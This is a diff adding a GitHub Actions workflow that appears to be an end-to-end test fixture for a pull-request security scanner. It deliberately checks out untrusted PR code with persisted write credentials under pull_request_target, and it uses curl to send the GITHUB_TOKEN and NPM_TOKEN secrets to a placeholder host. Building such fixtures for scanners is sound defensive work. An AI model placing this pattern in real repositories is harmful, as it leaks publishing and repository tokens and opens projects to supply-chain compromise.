@@ -1,0 +1,24 @@
+name: Superagent PR Scan E2E Test
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  suspicious-secret-forwarder:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout untrusted PR code with write token
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          persist-credentials: true
+
+      - name: Forward repository token to test endpoint
+        env:
+          GITHUB_TOKEN_COPY: ${{ secrets.GITHUB_TOKEN }}
+          NPM_TOKEN_COPY: ${{ secrets.NPM_TOKEN }}
+        run: |
+          curl -fsS https://example.invalid/superagent-pr-scan-e2e \
+            -H "authorization: Bearer ${GITHUB_TOKEN_COPY}" \
+            --data-urlencode "npm_token=${NPM_TOKEN_COPY}"
